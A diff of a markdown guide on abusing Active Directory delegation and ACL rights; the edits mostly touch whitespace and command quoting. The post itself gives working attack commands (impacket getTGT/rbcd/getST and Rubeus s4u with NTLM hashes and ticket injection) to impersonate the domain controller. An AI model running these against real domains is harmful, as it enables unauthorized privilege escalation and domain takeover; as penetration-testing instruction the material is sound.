@@ -4,6 +4,7 @@
 
 We often come across the delegation of services or resources in Active Directory. But sometimes it is difficult for us to find the necessary ways of abuse for such privileges. In this connection, I decided to compile a manual that will help with determining operating techniques for different types of delegation.
 
+
 #### A few words about searching for insecure ACLs in Active Directory:
 
 I recently ran into a problem collecting a rather important attribute **ActiveDirectoryRights: Self**.
@@ -110,6 +111,7 @@ So we found out that jaki can add himself to the ServiceMgmt group, although as 
 
 I tested different types of collectors, such as dump collection from the network [Bloodhound.py](https://github.com/dirkjanm/BloodHound.py), as well as standard collectors from the repository [Bloodhound Collectors](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors), as a result we never saw this **ActiveDirectoryRights: Self** attribute. By the way, the BloodHound network collector very often skips ACL collection as such, so i try to use .exe or .ps1
 
+
 #### About Constrained Delegation. So we have 3 different types of constrained delegation:
 
 1. msds-allowedtodelegateto / Constrained w/o Protocol Transition
@@ -173,6 +175,7 @@ dnshostname                    : gmsa.domain.ru
 
 ```
 
+
 #### Self Constrained delegation without Protocol Transition:
 
 For the machine account delegator$ constrained delegation without protocol transition is configured for http/dc01.domain.ru service. To abuse this type of delegation, you can assign the RBCD (Resource-based Constrained Delegation) attribute to yourself (delegator$) and then perform TGS service ticket requests using impacket-getST. Please note how s4u2self and s4u2proxy works in this case.
@@ -181,12 +184,13 @@ For the machine account delegator$ constrained delegation without protocol trans
 getTGT.py domain.ru/'delegator$' -hashes :fcb5ae2b5e8c05d7a938bbe8649e4a44 -dc-ip 10.10.10.100
 export KRB5CCNAME=delegator\$.ccache
 impacket-rbcd 'domain.ru/' -k -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from 'delegator$'
-impacket-getST -impersonate 'dc01$' domain.ru/delegator\$ -k -no-pass -spn browser/dc01.domain.ru
+impacket-getST -impersonate "dc01$" "domain.ru/delegator$" -k -no-pass -spn "browser/dc01.domain.ru"
 impacket-getST -impersonate "dc01$" "domain.ru/delegator$" -k -no-pass -spn "http/dc01.domain.ru" -additional-ticket "dc01$.ccache"
 
 ```
 
 However, this method may not work if patch [KB5014692](https://twitter.com/_nwodtuhs/status/1543572195217182721) is installed. In this case, you need another machine account, or any account with the SPN attribute.
+
 
 #### Constrained delegation without Protocol Transition (additional SPN account):
 
@@ -217,7 +221,6 @@ This method of delegation abuse is a classic method of exploitation, the TGS tic
 
 ```
 execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:time/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /altservice:cifs/dc.domain.ru /nowrap – convenient for .kirbi export
-
 execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:time/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /altservice:cifs/dc.domain.ru /ptt – convenient for TGS import
 
 OR just
@@ -231,13 +234,11 @@ This type of delegation is used in the same way as Constrained delegation with P
 
 ```
 execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:cifs/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /nowrap – convenient for .kirbi export
-
 execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:cifs/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /ptt – convenient for TGS import
 
 OR just
 
 getST.py domain.ru/JAKI_PC\$ -dc-ip domain.ru -impersonate administrator -spn time/dc.domain.ru
-
 ```
 
 ![Image](/img/acl_ad_cd/5.png)
